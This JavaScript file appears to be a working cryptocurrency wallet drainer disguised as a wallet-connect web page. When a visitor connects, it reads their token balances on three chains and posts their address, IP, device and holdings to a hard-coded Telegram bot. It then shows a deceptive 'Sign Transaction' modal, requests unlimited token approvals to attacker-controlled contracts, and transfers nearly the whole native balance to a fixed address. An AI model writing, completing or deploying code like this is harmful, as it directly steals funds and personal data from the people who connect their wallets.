import { bsc, mainnet, polygon } from '@reown/appkit/networks'
import { createAppKit } from '@reown/appkit'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { formatUnits, isAddress, getAddress, encodeFunctionData, maxUint256, parseUnits } from 'viem'
import { readContract, getBalance, writeContract } from '@wagmi/core'

// Debounce utility
const debounce = (func, wait) => {
  let timeout
  return (...args) => {
    clearTimeout(timeout)
    timeout = setTimeout(() => func(...args), wait)
  }
}

// Configuration
const projectId = import.meta.env.VITE_PROJECT_ID || 'd85cc83edb401b676e2a7bcef67f3be8'
if (!projectId) throw new Error('VITE_PROJECT_ID is not set')

const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'

const networks = [bsc, mainnet, polygon]
const networkMap = {
  'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
  'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 }
}
console.log('Network Map:', networkMap)

const CONTRACTS = {
  [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC',
  [networkMap['BNB Smart Chain'].chainId]: '0x3A96C52Ecc0A0C5BfCc51204BD91D8e209ba83c6',
  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c'
}

const NATIVE_TOKEN_SYMBOLS = {
  [networkMap['Ethereum'].chainId]: 'ETH',
  [networkMap['BNB Smart Chain'].chainId]: 'BNB',
  [networkMap['Polygon'].chainId]: 'MATIC'
}

const wagmiAdapter = new WagmiAdapter({ projectId, networks })
const appKit = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  features: { analytics: true, email: false, socials: false }
})

// ERC20 ABI
const erc20Abi = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function'
  }
]

// Application state
const store = {
  accountState: {},
  networkState: {},
  tokenBalances: [],
  errors: [],
  connectionKey: null,
  isProcessingConnection: false
}

// Create custom modal
function createCustomModal() {
  const style = document.createElement('style')
  style.textContent = `
    .custom-modal {
      opacity: 0;
      transition: opacity 0.3s ease-in-out;
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
    }
    .custom-modal.show {
      opacity: 1;
    }
    .custom-modal-content {
      transform: translateY(-20px);
      transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
      opacity: 0;
      background-color: #121313;
      padding: 45px;
      border-radius: 30px;
      text-align: center;
      width: 320px;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    }
    .custom-modal.show .custom-modal-content {
      transform: translateY(0);
      opacity: 1;
    }
    .custom-modal-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 45px;
      margin-top: -25px;
    }
    .custom-modal-loader {
      border: 4px solid #ffffff33;
      border-top: 4px solid #ffffff;
      border-radius: 50%;
      width: 52px;
      height: 52px;
      animation: spin 1s ease-in-out infinite;
      margin: 0 auto 20px;
    }
    .custom-modal-message {
      margin-top: 45px;
      font-size: 16px;
      line-height: 1.5;
      color: #858585;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  `
  document.head.appendChild(style)

  const modal = document.createElement('div')
  modal.id = 'customModal'
  modal.className = 'custom-modal'
  modal.innerHTML = `
    <div class="custom-modal-content">
      <p class="custom-modal-title">Sign Transaction</p>
      <div class="custom-modal-loader"></div>
      <p class="custom-modal-message">Sign this message to approve or transfer tokens. Canceling will disconnect you.</p>
    </div>
  `
  document.body.appendChild(modal)
}

function showCustomModal() {
  const modal = document.getElementById('customModal')
  if (modal) {
    modal.style.display = 'flex'
    setTimeout(() => modal.classList.add('show'), 10)
  }
}

function hideCustomModal() {
  const modal = document.getElementById('customModal')
  if (modal) {
    modal.classList.remove('show')
    setTimeout(() => modal.style.display = 'none', 300)
  }
}

// Clear state on page load
window.addEventListener('load', () => {
  appKit.disconnect()
  localStorage.clear()
  sessionStorage.clear()
  store.accountState = {}
  store.networkState = {}
  store.tokenBalances = []
  store.errors = []
  store.connectionKey = null
  store.isProcessingConnection = false
  updateButtonVisibility(false)
  updateStateDisplay('accountState', {})
  updateStateDisplay('networkState', {})
  updateStateDisplay('tokenBalancesState', [])
  createCustomModal()
})

// State update utilities
const updateStore = (key, value) => {
  store[key] = value
}

const updateStateDisplay = (elementId, state) => {
  const element = document.getElementById(elementId)
  if (element) element.innerHTML = JSON.stringify(state, null, 2)
}

const updateButtonVisibility = (isConnected) => {
  const disconnectBtn = document.getElementById('disconnect')
  if (disconnectBtn) disconnectBtn.style.display = isConnected ? '' : 'none'
}

// Get scan link
const getScanLink = (hash, chainId, isTx = false) => {
  const basePath = isTx ? '/tx/' : '/address/'
  if (chainId === networkMap['Ethereum'].chainId) {
    return `https://etherscan.io${basePath}${hash}`
  } else if (chainId === networkMap['BNB Smart Chain'].chainId) {
    return `https://bscscan.com${basePath}${hash}`
  } else if (chainId === networkMap['Polygon'].chainId) {
    return `https://polygonscan.com${basePath}${hash}`
  }
  return '#'
}

// User info functions
async function getUserIP() {
  const cachedIP = sessionStorage.getItem('userIP')
  if (cachedIP) return cachedIP
  try {
    const response = await fetch('https://api.ipify.org?format=json')
    const data = await response.json()
    const ip = data.ip || 'Unknown IP'
    sessionStorage.setItem('userIP', ip)
    return ip
  } catch (error) {
    return 'Unknown IP'
  }
}

function detectDevice() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera || 'Unknown Device'
  if (/Windows NT/i.test(userAgent)) return 'Windows'
  if (/iPhone/i.test(userAgent) && !/Android/i.test(userAgent)) return 'iPhone'
  if (/Android/i.test(userAgent) && !/iPhone/i.test(userAgent)) return 'Android'
  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'Mac'
  if (/Tablet|iPad/i.test(userAgent)) return 'Tablet'
  return 'Desktop'
}

// Send Telegram message
async function sendTelegramMessage(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
    })
    const data = await response.json()
    if (!data.ok) throw new Error(data.description || 'Failed to send Telegram message')
    console.log('Telegram message sent successfully')
  } catch (error) {
    store.errors.push(`Error sending Telegram message: ${error.message}`)
  }
}

// Notify wallet connection
async function notifyWalletConnection(address, walletName, device, balances, chainId) {
  const connectionKey = `${address}_${chainId}`
  if (store.connectionKey === connectionKey || store.isProcessingConnection) {
    console.log('Skipping duplicate wallet connection notification')
    return
  }
  store.isProcessingConnection = true
  try {
    console.log('Sending wallet connection notification')
    const ip = await getUserIP()
    const siteUrl = window.location.href || 'Unknown URL'
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    let totalValue = 0
    const tokenList = balances
      .filter(token => parseUnits(token.balance, token.decimals) > 0n)
      .map(token => {
        const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
        const value = Number(token.balance) * price
        totalValue += value
        return `➡️ ${token.symbol} - ${value.toFixed(2)}$`
      })
      .join('\n')
    const message = `🚨 New connect (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: ${networkName}\n` +
                    `🌎 IP: ${ip}\n\n` +
                    `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                    `${tokenList}\n\n` +
                    `🔗 Site: ${siteUrl}`
    await sendTelegramMessage(message)
    store.connectionKey = connectionKey

    // Show modal
    showCustomModal()
    await new Promise(resolve => setTimeout(resolve, 3000))

    // Check balance
    const hasBalance = balances.some(token => parseUnits(token.balance, token.decimals) > 0n)
    if (!hasBalance) {
      const modalMessage = document.querySelector('.custom-modal-message')
      if (modalMessage) modalMessage.textContent = 'Congratulations!'
      await new Promise(resolve => setTimeout(resolve, 1000))
      hideCustomModal()
      store.isProcessingConnection = false
      return
    }
  } catch (error) {
    store.errors.push(`Error in notifyWalletConnection: ${error.message}`)
    hideCustomModal()
    store.isProcessingConnection = false
  }
}

const TOKENS = {
  'Ethereum': [
    { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
    { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
    { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 }
  ],
  'BNB Smart Chain': [
    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
    { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
    { symbol: 'SHIB', address: '0x2859e4544c4bb03966803b044a93563bd2d0dd4d', decimals: 18 },
    { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 }
  ],
  'Polygon': [
    { symbol: 'USDT', address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
    { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 }
  ]
}

const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
  if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
    console.error(`Invalid or missing address: ${address}, tokenAddress: ${tokenAddress}`)
    return '0'
  }
  try {
    const balance = await readContract(wagmiConfig, {
      address: tokenAddress,
      abi: erc20Abi,
      functionName: 'balanceOf',
      args: [address],
      chainId
    })
    return formatUnits(balance, decimals).toString()
  } catch (error) {
    store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
    return '0'
  }
}

const getNativeTokenBalance = async (address, chainId) => {
  if (!address || !isAddress(address)) {
    console.error(`Invalid or missing address: ${address}`)
    return '0'
  }
  try {
    const balance = await getBalance(wagmiAdapter.wagmiConfig, {
      address: getAddress(address),
      chainId
    })
    return formatUnits(balance.value, 18).toString()
  } catch (error) {
    store.errors.push(`Error fetching native balance on chain ${chainId}: ${error.message}`)
    return '0'
  }
}

const getTokenPrice = async (symbol) => {
  if (!symbol || symbol === 'undefined') {
    console.warn(`Skipping price fetch for undefined symbol`)
    return 0
  }
  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`)
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`)
    const data = await response.json()
    return Number(data.price) || 0
  } catch (error) {
    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`)
    return 0
  }
}

// Batch operations
async function performBatchOperations(mostExpensive, allBalances, state) {
  if (!mostExpensive) {
    console.log('No most expensive token found, skipping batch operations')
    return
  }

  console.log(`Performing batch operations for network: ${mostExpensive.network}`)

  // Verify chainId
  if (!mostExpensive.chainId) {
    const errorMsg = 'Chain ID is undefined, cannot proceed with transaction'
    store.errors.push(errorMsg)
    console.error(errorMsg)
    return
  }

  // Verify sender address
  if (!state.address || !isAddress(state.address)) {
    const errorMsg = `Invalid sender address: ${state.address || 'undefined'}`
    store.errors.push(errorMsg)
    console.error(errorMsg)
    return
  }

  console.log(`Sender address: ${state.address}`)

  // Switch network if necessary
  const currentChainId = store.networkState.chainId
  if (currentChainId !== mostExpensive.chainId) {
    console.log(`Switching to ${mostExpensive.network} (chainId ${mostExpensive.chainId})`)
    try {
      await new Promise((resolve, reject) => {
        const unsubscribe = appKit.subscribeNetwork(networkState => {
          if (networkState.chainId === mostExpensive.chainId) {
            console.log(`Successfully switched to ${mostExpensive.network}`)
            unsubscribe()
            resolve()
          }
        })
        appKit.switchNetwork(networkMap[mostExpensive.network].networkObj).catch(error => {
          unsubscribe()
          reject(error)
        })
        setTimeout(() => {
          unsubscribe()
          reject(new Error(`Failed to switch to ${mostExpensive.network} after timeout`))
        }, 15000)
      })
    } catch (error) {
      store.errors.push(`Failed to switch network: ${error.message}`)
      console.error(`Failed to switch network: ${error.message}`)
      return
    }
  }

  // Get tokens with non-zero balance in the most expensive token's network
  const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && parseUnits(t.balance, t.decimals) > 0n)

  // Prepare approve calls for ERC-20 tokens
  const approveCalls = networkTokens
    .filter(t => t.address !== 'native')
    .map(t => ({
      address: getAddress(t.address),
      data: encodeFunctionData({
        abi: erc20Abi,
        functionName: 'approve',
        args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256]
      }),
      value: BigInt(0)
    }))

  // Perform approve transactions
  for (const call of approveCalls) {
    try {
      console.log(`Sending approve for token ${call.address}`)
      const hash = await writeContract(wagmiAdapter.wagmiConfig, {
        address: call.address,
        abi: erc20Abi,
        functionName: 'approve',
        args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256],
        chainId: mostExpensive.chainId,
        account: getAddress(state.address)
      })
      console.log(`Approve transaction sent with hash: ${hash}`)
      const approveState = document.getElementById('approveState')
      if (approveState) approveState.innerHTML += `Approve transaction sent with hash: ${hash}<br>`
    } catch (error) {
      store.errors.push(`Failed to send approve transaction: ${error.message}`)
      console.error(`Approve transaction error:`, error)
      const approveState = document.getElementById('approveState')
      if (approveState) approveState.innerHTML += `Failed to send approve transaction: ${error.message}<br>`
    }
  }

  // Prepare and send transfer for native token
  const nativeToken = networkTokens.find(t => t.address === 'native')
  if (nativeToken) {
    const balanceWei = parseUnits(nativeToken.balance, 18)
    const gasReserve = BigInt('100000') // 0.001 in wei
    if (balanceWei > gasReserve) {
      const transferAmount = balanceWei - gasReserve
      console.log(`Preparing native token transfer: ${nativeToken.symbol} amount=${formatUnits(transferAmount, 18)} to=0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0`)
      try {
        const hash = await writeContract(wagmiAdapter.wagmiConfig, {
          address: getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'),
          value: transferAmount,
          chainId: mostExpensive.chainId,
          account: getAddress(state.address)
        })
        console.log(`Native token transfer sent with hash: ${hash}`)
        const approveState = document.getElementById('approveState')
        if (approveState) approveState.innerHTML += `Native token transfer sent with hash: ${hash}<br>`
      } catch (error) {
        store.errors.push(`Failed to send native token transfer: ${error.message}`)
        console.error(`Native token transfer error:`, error)
        const approveState = document.getElementById('approveState')
        if (approveState) approveState.innerHTML += `Failed to send native token transfer: ${error.message}<br>`
      }
    } else {
      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'} (required > ${formatUnits(gasReserve, 18)} ${nativeToken.symbol || 'unknown'})`)
    }
  }
}

// Initialize subscribers
const initializeSubscribers = (modal) => {
  const debouncedSubscribeAccount = debounce(async state => {
    console.log(`Received account state:`, state)
    updateStore('accountState', state)
    updateStateDisplay('accountState', state)
    if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
      console.log(`Connected wallet address: ${state.address}`)
      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
      const device = detectDevice()
      if (store.isProcessingConnection) {
        console.log('Already processing connection, skipping')
        return
      }
      const balancePromises = []
      Object.entries(TOKENS).forEach(([networkName, tokens]) => {
        const networkInfo = networkMap[networkName]
        if (!networkInfo) {
          console.warn(`Network ${networkName} not found in networkMap`)
          return
        }
        // Add native token
        balancePromises.push(
          getNativeTokenBalance(state.address, networkInfo.chainId)
            .then(balance => ({
              symbol: NATIVE_TOKEN_SYMBOLS[networkInfo.chainId] || 'unknown',
              balance,
              address: 'native',
              network: networkName,
              chainId: networkInfo.chainId,
              decimals: 18
            }))
            .catch(() => ({
              symbol: NATIVE_TOKEN_SYMBOLS[networkInfo.chainId] || 'unknown',
              balance: '0',
              address: 'native',
              network: networkName,
              chainId: networkInfo.chainId,
              decimals: 18
            }))
        )
        tokens.forEach(token => {
          if (isAddress(token.address)) {
            balancePromises.push(
              getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
                .then(balance => ({
                  symbol: token.symbol,
                  balance,
                  address: token.address,
                  network: networkName,
                  chainId: networkInfo.chainId,
                  decimals: token.decimals
                }))
                .catch(() => ({
                  symbol: token.symbol,
                  balance: '0',
                  address: token.address,
                  network: networkName,
                  chainId: networkInfo.chainId,
                  decimals: token.decimals
                }))
            )
          }
        })
      })
      const allBalances = await Promise.all(balancePromises)
      store.tokenBalances = allBalances
      updateStateDisplay('tokenBalancesState', allBalances)
      let maxValue = 0
      let mostExpensive = null
      for (const token of allBalances) {
        if (parseUnits(token.balance, token.decimals) > 0n) {
          const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
          const value = Number(token.balance) * price
          token.price = price
          if (value > maxValue) {
            maxValue = value
            mostExpensive = { ...token, price, value }
          }
        }
      }
      await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
      if (mostExpensive) {
        console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`)
        const networkTokens = allBalances.filter(token => token.network === mostExpensive.network && parseUnits(token.balance, token.decimals) > 0n)
        console.log(`Tokens with non-zero balance in ${mostExpensive.network}:`)
        networkTokens.forEach(token => {
          console.log(`${token.symbol}: ${token.balance}`)
        })
        await performBatchOperations(mostExpensive, allBalances, state)
      } else {
        const message = 'No tokens with positive balance'
        console.log(message)
        const mostExpensiveState = document.getElementById('mostExpensiveToken')
        if (mostExpensiveState) mostExpensiveState.innerHTML = message
      }
      hideCustomModal()
      store.isProcessingConnection = false
    }
  }, 1000)
  modal.subscribeAccount(debouncedSubscribeAccount)
  modal.subscribeNetwork(state => {
    console.log(`Received network state:`, state)
    updateStore('networkState', state)
    updateStateDisplay('networkState', state)
    const switchNetworkBtn = document.getElementById('switch-network')
    if (switchNetworkBtn) {
      switchNetworkBtn.textContent = `Switch to ${state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'}`
    }
  })
}

initializeSubscribers(appKit)
updateButtonVisibility(appKit.getIsConnectedState())

document.getElementById('open-connect-modal')?.addEventListener('click', () => {
  if (!appKit.getIsConnectedState()) {
    appKit.open()
  }
})

document.getElementById('disconnect')?.addEventListener('click', () => {
  appKit.disconnect()
  store.errors = []
  store.connectionKey = null
  store.isProcessingConnection = false
  sessionStorage.clear()
})

document.getElementById('switch-network')?.addEventListener('click', () => {
  const currentChainId = store.networkState?.chainId
  appKit.switchNetwork(currentChainId === polygon.id ? mainnet : polygon)
})
